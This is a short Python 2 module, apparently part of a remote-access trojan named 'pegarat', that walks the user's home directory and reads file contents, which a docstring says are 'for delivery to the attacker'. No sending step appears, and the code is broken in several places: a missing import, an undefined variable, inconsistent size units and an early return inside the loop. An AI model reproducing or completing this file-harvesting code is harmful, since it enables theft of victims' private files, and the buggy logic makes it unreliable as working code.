#!/bin/python
#
#libpegarat.py implements all algorithms used in pegarat.py
#

def init_sys():
	home = os.environ['HOME']
	os.path.walk(home,check_file_size,None)
	args = []
	os.path.walk(home,check_file_size,arg)
	for size,filename in args:
		if(size < 10000):
			files = collect_files(filename)
			return files
		else:
			pass

def check_file_size(arg, dirname, files):
	for file in files:
		filename = os.path.join(dirname,file)
		if os.path.isfile(filename):
			size = os.path.getsize(filename)
			if size > 10000000:
				if arg is None:
					print '%.2fMB %s'%(size/10000000.0,filename)
				elif isinstance(arg,list):
					arg.append((size/10000000.0,filename))


def collect_files(filename):
	"""
	parse filename and return its contents for delivery to the attacker.
	"""
	with open(filename,'r') as f:
		f_read = f.read()
	return f_read
